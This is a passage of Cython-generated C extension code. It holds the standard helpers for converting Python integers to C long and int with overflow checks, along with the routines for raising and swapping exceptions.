                                __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                            } else if ((8 * sizeof(long) >= 2 * PyLong_SHIFT)) {
                                return (long) (((((long)digits[1]) << PyLong_SHIFT) | (long)digits[0]));
                            }
                        }
                        break;
                    case 3:
                        if ((8 * sizeof(long) > 2 * PyLong_SHIFT)) {
                            if ((8 * sizeof(unsigned long) > 3 * PyLong_SHIFT)) {
                                __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                            } else if ((8 * sizeof(long) >= 3 * PyLong_SHIFT)) {
                                return (long) (((((((long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0]));
                            }
                        }
                        break;
                    case 4:
                        if ((8 * sizeof(long) > 3 * PyLong_SHIFT)) {
                            if ((8 * sizeof(unsigned long) > 4 * PyLong_SHIFT)) {
                                __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                            } else if ((8 * sizeof(long) >= 4 * PyLong_SHIFT)) {
                                return (long) (((((((((long)digits[3]) << PyLong_SHIFT) | (long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0]));
                            }
                        }
                        break;
                }
            }
#endif
#if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX < 0x030C00A7
            if (unlikely(Py_SIZE(x) < 0)) {
                goto raise_neg_overflow;
            }
#else
            {
                int result = PyObject_RichCompareBool(x, Py_False, Py_LT);
                if (unlikely(result < 0))
                    return (long) -1;
                if (unlikely(result == 1))
                    goto raise_neg_overflow;
            }
#endif
            if ((sizeof(long) <= sizeof(unsigned long))) {
                __PYX_VERIFY_RETURN_INT_EXC(long, unsigned long, PyLong_AsUnsignedLong(x))
#ifdef HAVE_LONG_LONG
            } else if ((sizeof(long) <= sizeof(unsigned PY_LONG_LONG))) {
                __PYX_VERIFY_RETURN_INT_EXC(long, unsigned PY_LONG_LONG, PyLong_AsUnsignedLongLong(x))
#endif
            }
        } else {
#if CYTHON_USE_PYLONG_INTERNALS
            if (__Pyx_PyLong_IsCompact(x)) {
                __PYX_VERIFY_RETURN_INT(long, __Pyx_compact_pylong, __Pyx_PyLong_CompactValue(x))
            } else {
                const digit* digits = __Pyx_PyLong_Digits(x);
                assert(__Pyx_PyLong_DigitCount(x) > 1);
                switch (__Pyx_PyLong_SignedDigitCount(x)) {
                    case -2:
                        if ((8 * sizeof(long) - 1 > 1 * PyLong_SHIFT)) {
                            if ((8 * sizeof(unsigned long) > 2 * PyLong_SHIFT)) {
                                __PYX_VERIFY_RETURN_INT(long, long, -(long) (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                            } else if ((8 * sizeof(long) - 1 > 2 * PyLong_SHIFT)) {
                                return (long) (((long)-1)*(((((long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                            }
                        }
                        break;
                    case 2:
                        if ((8 * sizeof(long) > 1 * PyLong_SHIFT)) {
                            if ((8 * sizeof(unsigned long) > 2 * PyLong_SHIFT)) {
                                __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                            } else if ((8 * sizeof(long) - 1 > 2 * PyLong_SHIFT)) {
                                return (long) ((((((long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                            }
                        }
                        break;
                    case -3:
                        if ((8 * sizeof(long) - 1 > 2 * PyLong_SHIFT)) {
                            if ((8 * sizeof(unsigned long) > 3 * PyLong_SHIFT)) {
                                __PYX_VERIFY_RETURN_INT(long, long, -(long) (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                            } else if ((8 * sizeof(long) - 1 > 3 * PyLong_SHIFT)) {
                                return (long) (((long)-1)*(((((((long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                            }
                        }
                        break;
                    case 3:
                        if ((8 * sizeof(long) > 2 * PyLong_SHIFT)) {
                            if ((8 * sizeof(unsigned long) > 3 * PyLong_SHIFT)) {
                                __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                            } else if ((8 * sizeof(long) - 1 > 3 * PyLong_SHIFT)) {
                                return (long) ((((((((long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                            }
                        }
                        break;
                    case -4:
                        if ((8 * sizeof(long) - 1 > 3 * PyLong_SHIFT)) {
                            if ((8 * sizeof(unsigned long) > 4 * PyLong_SHIFT)) {
                                __PYX_VERIFY_RETURN_INT(long, long, -(long) (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                            } else if ((8 * sizeof(long) - 1 > 4 * PyLong_SHIFT)) {
                                return (long) (((long)-1)*(((((((((long)digits[3]) << PyLong_SHIFT) | (long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                            }
                        }
                        break;
                    case 4:
                        if ((8 * sizeof(long) > 3 * PyLong_SHIFT)) {
                            if ((8 * sizeof(unsigned long) > 4 * PyLong_SHIFT)) {
                                __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                            } else if ((8 * sizeof(long) - 1 > 4 * PyLong_SHIFT)) {
                                return (long) ((((((((((long)digits[3]) << PyLong_SHIFT) | (long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                            }
                        }
                        break;
                }
            }
#endif
            if ((sizeof(long) <= sizeof(long))) {
                __PYX_VERIFY_RETURN_INT_EXC(long, long, PyLong_AsLong(x))
#ifdef HAVE_LONG_LONG
            } else if ((sizeof(long) <= sizeof(PY_LONG_LONG))) {
                __PYX_VERIFY_RETURN_INT_EXC(long, PY_LONG_LONG, PyLong_AsLongLong(x))
#endif
            }
        }
        {
            long val;
            PyObject *v = __Pyx_PyNumber_IntOrLong(x);
#if PY_MAJOR_VERSION < 3
            if (likely(v) && !PyLong_Check(v)) {
                PyObject *tmp = v;
                v = PyNumber_Long(tmp);
                Py_DECREF(tmp);
            }
#endif
            if (likely(v)) {
                int ret = -1;
#if !(CYTHON_COMPILING_IN_PYPY || CYTHON_COMPILING_IN_LIMITED_API) || defined(_PyLong_AsByteArray)
                int one = 1; int is_little = (int)*(unsigned char *)&one;
                unsigned char *bytes = (unsigned char *)&val;
                ret = _PyLong_AsByteArray((PyLongObject *)v,
                                           bytes, sizeof(val),
                                           is_little, !is_unsigned);
#else
                PyObject *stepval = NULL, *mask = NULL, *shift = NULL;
                int bits, remaining_bits, is_negative = 0;
                long idigit;
                int chunk_size = (sizeof(long) < 8) ? 30 : 62;
                if (unlikely(!PyLong_CheckExact(v))) {
                    PyObject *tmp = v;
                    v = PyNumber_Long(v);
                    assert(PyLong_CheckExact(v));
                    Py_DECREF(tmp);
                    if (unlikely(!v)) return (long) -1;
                }
#if CYTHON_COMPILING_IN_LIMITED_API && PY_VERSION_HEX < 0x030B0000
                if (Py_SIZE(x) == 0)
                    return (long) 0;
                is_negative = Py_SIZE(x) < 0;
#else
                {
                    int result = PyObject_RichCompareBool(x, Py_False, Py_LT);
                    if (unlikely(result < 0))
                        return (long) -1;
                    is_negative = result == 1;
                }
#endif
                if (is_unsigned && unlikely(is_negative)) {
                    goto raise_neg_overflow;
                } else if (is_negative) {
                    stepval = PyNumber_Invert(v);
                    if (unlikely(!stepval))
                        return (long) -1;
                } else {
                    stepval = __Pyx_NewRef(v);
                }
                val = (long) 0;
                mask = PyLong_FromLong((1L << chunk_size) - 1); if (unlikely(!mask)) goto done;
                shift = PyLong_FromLong(chunk_size); if (unlikely(!shift)) goto done;
                for (bits = 0; bits < (int) sizeof(long) * 8 - chunk_size; bits += chunk_size) {
                    PyObject *tmp, *digit;
                    digit = PyNumber_And(stepval, mask);
                    if (unlikely(!digit)) goto done;
                    idigit = PyLong_AsLong(digit);
                    Py_DECREF(digit);
                    if (unlikely(idigit < 0)) goto done;
                    tmp = PyNumber_Rshift(stepval, shift);
                    if (unlikely(!tmp)) goto done;
                    Py_DECREF(stepval); stepval = tmp;
                    val |= ((long) idigit) << bits;
                    #if CYTHON_COMPILING_IN_LIMITED_API && PY_VERSION_HEX < 0x030B0000
                    if (Py_SIZE(stepval) == 0)
                        goto unpacking_done;
                    #endif
                }
                idigit = PyLong_AsLong(stepval);
                if (unlikely(idigit < 0)) goto done;
                remaining_bits = ((int) sizeof(long) * 8) - bits - (is_unsigned ? 0 : 1);
                if (unlikely(idigit >= (1L << remaining_bits)))
                    goto raise_overflow;
                val |= ((long) idigit) << bits;
            #if CYTHON_COMPILING_IN_LIMITED_API && PY_VERSION_HEX < 0x030B0000
            unpacking_done:
            #endif
                if (!is_unsigned) {
                    if (unlikely(val & (((long) 1) << (sizeof(long) * 8 - 1))))
                        goto raise_overflow;
                    if (is_negative)
                        val = ~val;
                }
                ret = 0;
            done:
                Py_XDECREF(shift);
                Py_XDECREF(mask);
                Py_XDECREF(stepval);
#endif
                Py_DECREF(v);
                if (likely(!ret))
                    return val;
            }
            return (long) -1;
        }
    } else {
        long val;
        PyObject *tmp = __Pyx_PyNumber_IntOrLong(x);
        if (!tmp) return (long) -1;
        val = __Pyx_PyInt_As_long(tmp);
        Py_DECREF(tmp);
        return val;
    }
raise_overflow:
    PyErr_SetString(PyExc_OverflowError,
        "value too large to convert to long");
    return (long) -1;
raise_neg_overflow:
    PyErr_SetString(PyExc_OverflowError,
        "can't convert negative value to long");
    return (long) -1;
}

/* CIntToPy */
static CYTHON_INLINE PyObject* __Pyx_PyInt_From_long(long value) {
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wconversion"
#endif
    const long neg_one = (long) -1, const_zero = (long) 0;
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic pop
#endif
    const int is_unsigned = neg_one > const_zero;
    if (is_unsigned) {
        if (sizeof(long) < sizeof(long)) {
            return PyInt_FromLong((long) value);
        } else if (sizeof(long) <= sizeof(unsigned long)) {
            return PyLong_FromUnsignedLong((unsigned long) value);
#ifdef HAVE_LONG_LONG
        } else if (sizeof(long) <= sizeof(unsigned PY_LONG_LONG)) {
            return PyLong_FromUnsignedLongLong((unsigned PY_LONG_LONG) value);
#endif
        }
    } else {
        if (sizeof(long) <= sizeof(long)) {
            return PyInt_FromLong((long) value);
#ifdef HAVE_LONG_LONG
        } else if (sizeof(long) <= sizeof(PY_LONG_LONG)) {
            return PyLong_FromLongLong((PY_LONG_LONG) value);
#endif
        }
    }
    {
        int one = 1; int little = (int)*(unsigned char *)&one;
        unsigned char *bytes = (unsigned char *)&value;
        return _PyLong_FromByteArray(bytes, sizeof(long),
                                     little, !is_unsigned);
    }
}

/* FormatTypeName */
#if CYTHON_COMPILING_IN_LIMITED_API
static __Pyx_TypeName
__Pyx_PyType_GetName(PyTypeObject* tp)
{
    PyObject *name = __Pyx_PyObject_GetAttrStr((PyObject *)tp,
                                               __pyx_n_s_name_2);
    if (unlikely(name == NULL) || unlikely(!PyUnicode_Check(name))) {
        PyErr_Clear();
        Py_XSETREF(name, __Pyx_NewRef(__pyx_n_s__110));
    }
    return name;
}
#endif

/* CIntFromPy */
static CYTHON_INLINE int __Pyx_PyInt_As_int(PyObject *x) {
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wconversion"
#endif
    const int neg_one = (int) -1, const_zero = (int) 0;
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic pop
#endif
    const int is_unsigned = neg_one > const_zero;
#if PY_MAJOR_VERSION < 3
    if (likely(PyInt_Check(x))) {
        if ((sizeof(int) < sizeof(long))) {
            __PYX_VERIFY_RETURN_INT(int, long, PyInt_AS_LONG(x))
        } else {
            long val = PyInt_AS_LONG(x);
            if (is_unsigned && unlikely(val < 0)) {
                goto raise_neg_overflow;
            }
            return (int) val;
        }
    } else
#endif
    if (likely(PyLong_Check(x))) {
        if (is_unsigned) {
#if CYTHON_USE_PYLONG_INTERNALS
            if (unlikely(__Pyx_PyLong_IsNeg(x))) {
                goto raise_neg_overflow;
            } else if (__Pyx_PyLong_IsCompact(x)) {
                __PYX_VERIFY_RETURN_INT(int, __Pyx_compact_upylong, __Pyx_PyLong_CompactValueUnsigned(x))
            } else {
                const digit* digits = __Pyx_PyLong_Digits(x);
                assert(__Pyx_PyLong_DigitCount(x) > 1);
                switch (__Pyx_PyLong_DigitCount(x)) {
                    case 2:
                        if ((8 * sizeof(int) > 1 * PyLong_SHIFT)) {
                            if ((8 * sizeof(unsigned long) > 2 * PyLong_SHIFT)) {
                                __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                            } else if ((8 * sizeof(int) >= 2 * PyLong_SHIFT)) {
                                return (int) (((((int)digits[1]) << PyLong_SHIFT) | (int)digits[0]));
                            }
                        }
                        break;
                    case 3:
                        if ((8 * sizeof(int) > 2 * PyLong_SHIFT)) {
                            if ((8 * sizeof(unsigned long) > 3 * PyLong_SHIFT)) {
                                __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                            } else if ((8 * sizeof(int) >= 3 * PyLong_SHIFT)) {
                                return (int) (((((((int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0]));
                            }
                        }
                        break;
                    case 4:
                        if ((8 * sizeof(int) > 3 * PyLong_SHIFT)) {
                            if ((8 * sizeof(unsigned long) > 4 * PyLong_SHIFT)) {
                                __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                            } else if ((8 * sizeof(int) >= 4 * PyLong_SHIFT)) {
                                return (int) (((((((((int)digits[3]) << PyLong_SHIFT) | (int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0]));
                            }
                        }
                        break;
                }
            }
#endif
#if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX < 0x030C00A7
            if (unlikely(Py_SIZE(x) < 0)) {
                goto raise_neg_overflow;
            }
#else
            {
                int result = PyObject_RichCompareBool(x, Py_False, Py_LT);
                if (unlikely(result < 0))
                    return (int) -1;
                if (unlikely(result == 1))
                    goto raise_neg_overflow;
            }
#endif
            if ((sizeof(int) <= sizeof(unsigned long))) {
                __PYX_VERIFY_RETURN_INT_EXC(int, unsigned long, PyLong_AsUnsignedLong(x))
#ifdef HAVE_LONG_LONG
            } else if ((sizeof(int) <= sizeof(unsigned PY_LONG_LONG))) {
                __PYX_VERIFY_RETURN_INT_EXC(int, unsigned PY_LONG_LONG, PyLong_AsUnsignedLongLong(x))
#endif
            }
        } else {
#if CYTHON_USE_PYLONG_INTERNALS
            if (__Pyx_PyLong_IsCompact(x)) {
                __PYX_VERIFY_RETURN_INT(int, __Pyx_compact_pylong, __Pyx_PyLong_CompactValue(x))
            } else {
                const digit* digits = __Pyx_PyLong_Digits(x);
                assert(__Pyx_PyLong_DigitCount(x) > 1);
                switch (__Pyx_PyLong_SignedDigitCount(x)) {
                    case -2:
                        if ((8 * sizeof(int) - 1 > 1 * PyLong_SHIFT)) {
                            if ((8 * sizeof(unsigned long) > 2 * PyLong_SHIFT)) {
                                __PYX_VERIFY_RETURN_INT(int, long, -(long) (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                            } else if ((8 * sizeof(int) - 1 > 2 * PyLong_SHIFT)) {
                                return (int) (((int)-1)*(((((int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                            }
                        }
                        break;
                    case 2:
                        if ((8 * sizeof(int) > 1 * PyLong_SHIFT)) {
                            if ((8 * sizeof(unsigned long) > 2 * PyLong_SHIFT)) {
                                __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                            } else if ((8 * sizeof(int) - 1 > 2 * PyLong_SHIFT)) {
                                return (int) ((((((int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                            }
                        }
                        break;
                    case -3:
                        if ((8 * sizeof(int) - 1 > 2 * PyLong_SHIFT)) {
                            if ((8 * sizeof(unsigned long) > 3 * PyLong_SHIFT)) {
                                __PYX_VERIFY_RETURN_INT(int, long, -(long) (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                            } else if ((8 * sizeof(int) - 1 > 3 * PyLong_SHIFT)) {
                                return (int) (((int)-1)*(((((((int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                            }
                        }
                        break;
                    case 3:
                        if ((8 * sizeof(int) > 2 * PyLong_SHIFT)) {
                            if ((8 * sizeof(unsigned long) > 3 * PyLong_SHIFT)) {
                                __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                            } else if ((8 * sizeof(int) - 1 > 3 * PyLong_SHIFT)) {
                                return (int) ((((((((int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                            }
                        }
                        break;
                    case -4:
                        if ((8 * sizeof(int) - 1 > 3 * PyLong_SHIFT)) {
                            if ((8 * sizeof(unsigned long) > 4 * PyLong_SHIFT)) {
                                __PYX_VERIFY_RETURN_INT(int, long, -(long) (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                            } else if ((8 * sizeof(int) - 1 > 4 * PyLong_SHIFT)) {
                                return (int) (((int)-1)*(((((((((int)digits[3]) << PyLong_SHIFT) | (int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                            }
                        }
                        break;
                    case 4:
                        if ((8 * sizeof(int) > 3 * PyLong_SHIFT)) {
                            if ((8 * sizeof(unsigned long) > 4 * PyLong_SHIFT)) {
                                __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                            } else if ((8 * sizeof(int) - 1 > 4 * PyLong_SHIFT)) {
                                return (int) ((((((((((int)digits[3]) << PyLong_SHIFT) | (int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                            }
                        }
                        break;
                }
            }
#endif
            if ((sizeof(int) <= sizeof(long))) {
                __PYX_VERIFY_RETURN_INT_EXC(int, long, PyLong_AsLong(x))
#ifdef HAVE_LONG_LONG
            } else if ((sizeof(int) <= sizeof(PY_LONG_LONG))) {
                __PYX_VERIFY_RETURN_INT_EXC(int, PY_LONG_LONG, PyLong_AsLongLong(x))
#endif
            }
        }
        {
            int val;
            PyObject *v = __Pyx_PyNumber_IntOrLong(x);
#if PY_MAJOR_VERSION < 3
            if (likely(v) && !PyLong_Check(v)) {
                PyObject *tmp = v;
                v = PyNumber_Long(tmp);
                Py_DECREF(tmp);
            }
#endif
            if (likely(v)) {
                int ret = -1;
#if !(CYTHON_COMPILING_IN_PYPY || CYTHON_COMPILING_IN_LIMITED_API) || defined(_PyLong_AsByteArray)
                int one = 1; int is_little = (int)*(unsigned char *)&one;
                unsigned char *bytes = (unsigned char *)&val;
                ret = _PyLong_AsByteArray((PyLongObject *)v,
                                           bytes, sizeof(val),
                                           is_little, !is_unsigned);
#else
                PyObject *stepval = NULL, *mask = NULL, *shift = NULL;
                int bits, remaining_bits, is_negative = 0;
                long idigit;
                int chunk_size = (sizeof(long) < 8) ? 30 : 62;
                if (unlikely(!PyLong_CheckExact(v))) {
                    PyObject *tmp = v;
                    v = PyNumber_Long(v);
                    assert(PyLong_CheckExact(v));
                    Py_DECREF(tmp);
                    if (unlikely(!v)) return (int) -1;
                }
#if CYTHON_COMPILING_IN_LIMITED_API && PY_VERSION_HEX < 0x030B0000
                if (Py_SIZE(x) == 0)
                    return (int) 0;
                is_negative = Py_SIZE(x) < 0;
#else
                {
                    int result = PyObject_RichCompareBool(x, Py_False, Py_LT);
                    if (unlikely(result < 0))
                        return (int) -1;
                    is_negative = result == 1;
                }
#endif
                if (is_unsigned && unlikely(is_negative)) {
                    goto raise_neg_overflow;
                } else if (is_negative) {
                    stepval = PyNumber_Invert(v);
                    if (unlikely(!stepval))
                        return (int) -1;
                } else {
                    stepval = __Pyx_NewRef(v);
                }
                val = (int) 0;
                mask = PyLong_FromLong((1L << chunk_size) - 1); if (unlikely(!mask)) goto done;
                shift = PyLong_FromLong(chunk_size); if (unlikely(!shift)) goto done;
                for (bits = 0; bits < (int) sizeof(int) * 8 - chunk_size; bits += chunk_size) {
                    PyObject *tmp, *digit;
                    digit = PyNumber_And(stepval, mask);
                    if (unlikely(!digit)) goto done;
                    idigit = PyLong_AsLong(digit);
                    Py_DECREF(digit);
                    if (unlikely(idigit < 0)) goto done;
                    tmp = PyNumber_Rshift(stepval, shift);
                    if (unlikely(!tmp)) goto done;
                    Py_DECREF(stepval); stepval = tmp;
                    val |= ((int) idigit) << bits;
                    #if CYTHON_COMPILING_IN_LIMITED_API && PY_VERSION_HEX < 0x030B0000
                    if (Py_SIZE(stepval) == 0)
                        goto unpacking_done;
                    #endif
                }
                idigit = PyLong_AsLong(stepval);
                if (unlikely(idigit < 0)) goto done;
                remaining_bits = ((int) sizeof(int) * 8) - bits - (is_unsigned ? 0 : 1);
                if (unlikely(idigit >= (1L << remaining_bits)))
                    goto raise_overflow;
                val |= ((int) idigit) << bits;
            #if CYTHON_COMPILING_IN_LIMITED_API && PY_VERSION_HEX < 0x030B0000
            unpacking_done:
            #endif
                if (!is_unsigned) {
                    if (unlikely(val & (((int) 1) << (sizeof(int) * 8 - 1))))
                        goto raise_overflow;
                    if (is_negative)
                        val = ~val;
                }
                ret = 0;
            done:
                Py_XDECREF(shift);
                Py_XDECREF(mask);
                Py_XDECREF(stepval);
#endif
                Py_DECREF(v);
                if (likely(!ret))
                    return val;
            }
            return (int) -1;
        }
    } else {
        int val;
        PyObject *tmp = __Pyx_PyNumber_IntOrLong(x);
        if (!tmp) return (int) -1;
        val = __Pyx_PyInt_As_int(tmp);
        Py_DECREF(tmp);
        return val;
    }
raise_overflow:
    PyErr_SetString(PyExc_OverflowError,
        "value too large to convert to int");
    return (int) -1;
raise_neg_overflow:
    PyErr_SetString(PyExc_OverflowError,
        "can't convert negative value to int");
    return (int) -1;
}

/* RaiseException */
#if PY_MAJOR_VERSION < 3
static void __Pyx_Raise(PyObject *type, PyObject *value, PyObject *tb, PyObject *cause) {
    __Pyx_PyThreadState_declare
    CYTHON_UNUSED_VAR(cause);
    Py_XINCREF(type);
    if (!value || value == Py_None)
        value = NULL;
    else
        Py_INCREF(value);
    if (!tb || tb == Py_None)
        tb = NULL;
    else {
        Py_INCREF(tb);
        if (!PyTraceBack_Check(tb)) {
            PyErr_SetString(PyExc_TypeError,
                "raise: arg 3 must be a traceback or None");
            goto raise_error;
        }
    }
    if (PyType_Check(type)) {
#if CYTHON_COMPILING_IN_PYPY
        if (!value) {
            Py_INCREF(Py_None);
            value = Py_None;
        }
#endif
        PyErr_NormalizeException(&type, &value, &tb);
    } else {
        if (value) {
            PyErr_SetString(PyExc_TypeError,
                "instance exception may not have a separate value");
            goto raise_error;
        }
        value = type;
        type = (PyObject*) Py_TYPE(type);
        Py_INCREF(type);
        if (!PyType_IsSubtype((PyTypeObject *)type, (PyTypeObject *)PyExc_BaseException)) {
            PyErr_SetString(PyExc_TypeError,
                "raise: exception class must be a subclass of BaseException");
            goto raise_error;
        }
    }
    __Pyx_PyThreadState_assign
    __Pyx_ErrRestore(type, value, tb);
    return;
raise_error:
    Py_XDECREF(value);
    Py_XDECREF(type);
    Py_XDECREF(tb);
    return;
}
#else
static void __Pyx_Raise(PyObject *type, PyObject *value, PyObject *tb, PyObject *cause) {
    PyObject* owned_instance = NULL;
    if (tb == Py_None) {
        tb = 0;
    } else if (tb && !PyTraceBack_Check(tb)) {
        PyErr_SetString(PyExc_TypeError,
            "raise: arg 3 must be a traceback or None");
        goto bad;
    }
    if (value == Py_None)
        value = 0;
    if (PyExceptionInstance_Check(type)) {
        if (value) {
            PyErr_SetString(PyExc_TypeError,
                "instance exception may not have a separate value");
            goto bad;
        }
        value = type;
        type = (PyObject*) Py_TYPE(value);
    } else if (PyExceptionClass_Check(type)) {
        PyObject *instance_class = NULL;
        if (value && PyExceptionInstance_Check(value)) {
            instance_class = (PyObject*) Py_TYPE(value);
            if (instance_class != type) {
                int is_subclass = PyObject_IsSubclass(instance_class, type);
                if (!is_subclass) {
                    instance_class = NULL;
                } else if (unlikely(is_subclass == -1)) {
                    goto bad;
                } else {
                    type = instance_class;
                }
            }
        }
        if (!instance_class) {
            PyObject *args;
            if (!value)
                args = PyTuple_New(0);
            else if (PyTuple_Check(value)) {
                Py_INCREF(value);
                args = value;
            } else
                args = PyTuple_Pack(1, value);
            if (!args)
                goto bad;
            owned_instance = PyObject_Call(type, args, NULL);
            Py_DECREF(args);
            if (!owned_instance)
                goto bad;
            value = owned_instance;
            if (!PyExceptionInstance_Check(value)) {
                PyErr_Format(PyExc_TypeError,
                             "calling %R should have returned an instance of "
                             "BaseException, not %R",
                             type, Py_TYPE(value));
                goto bad;
            }
        }
    } else {
        PyErr_SetString(PyExc_TypeError,
            "raise: exception class must be a subclass of BaseException");
        goto bad;
    }
    if (cause) {
        PyObject *fixed_cause;
        if (cause == Py_None) {
            fixed_cause = NULL;
        } else if (PyExceptionClass_Check(cause)) {
            fixed_cause = PyObject_CallObject(cause, NULL);
            if (fixed_cause == NULL)
                goto bad;
        } else if (PyExceptionInstance_Check(cause)) {
            fixed_cause = cause;
            Py_INCREF(fixed_cause);
        } else {
            PyErr_SetString(PyExc_TypeError,
                            "exception causes must derive from "
                            "BaseException");
            goto bad;
        }
        PyException_SetCause(value, fixed_cause);
    }
    PyErr_SetObject(type, value);
    if (tb) {
      #if PY_VERSION_HEX >= 0x030C00A6
        PyException_SetTraceback(value, tb);
      #elif CYTHON_FAST_THREAD_STATE
        PyThreadState *tstate = __Pyx_PyThreadState_Current;
        PyObject* tmp_tb = tstate->curexc_traceback;
        if (tb != tmp_tb) {
            Py_INCREF(tb);
            tstate->curexc_traceback = tb;
            Py_XDECREF(tmp_tb);
        }
#else
        PyObject *tmp_type, *tmp_value, *tmp_tb;
        PyErr_Fetch(&tmp_type, &tmp_value, &tmp_tb);
        Py_INCREF(tb);
        PyErr_Restore(tmp_type, tmp_value, tb);
        Py_XDECREF(tmp_tb);
#endif
    }
bad:
    Py_XDECREF(owned_instance);
    return;
}
#endif

/* SwapException */
#if CYTHON_FAST_THREAD_STATE
static CYTHON_INLINE void __Pyx__ExceptionSwap(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb) {
    PyObject *tmp_type, *tmp_value, *tmp_tb;
  #if CYTHON_USE_EXC_INFO_STACK && PY_VERSION_HEX >= 0x030B00a4
    _PyErr_StackItem *exc_info = tstate->exc_info;
    tmp_value = exc_info->exc_value;
    exc_info->exc_value = *value;
    if (tmp_value == NULL || tmp_value == Py_None) {
        Py_XDECREF(tmp_value);
        tmp_value = NULL;
        tmp_type = NULL;
        tmp_tb = NULL;
    } else {
        tmp_type = (PyObject*) Py_TYPE(tmp_value);
        Py_INCREF(tmp_type);
        #if CYTHON_COMPILING_IN_CPYTHON
        tmp_tb = ((PyBaseExceptionObject*) tmp_value)->traceback;
        Py_XINCREF(tmp_tb);
        #else
        tmp_tb = PyException_GetTraceback(tmp_value);
        #endif
    }
  #elif CYTHON_USE_EXC_INFO_STACK
    _PyErr_StackItem *exc_info = tstate->exc_info;
    tmp_type = exc_info->exc_type;
    tmp_value = exc_info->exc_value;
    tmp_tb = exc_info->exc_traceback;
    exc_info->exc_type = *type;
    exc_info->exc_value = *value;
    exc_info->exc_traceback = *tb;
  #else
    tmp_type = tstate->exc_type;
    tmp_value = tstate->exc_value;
    tmp_tb = tstate->exc_traceback;
    tstate->exc_type = *type;
    tstate->exc_value = *value;
    tstate->exc_traceback = *tb;
  #endif
    *type = tmp_type;
    *value = tmp_value;
    *tb = tmp_tb;
}
#else
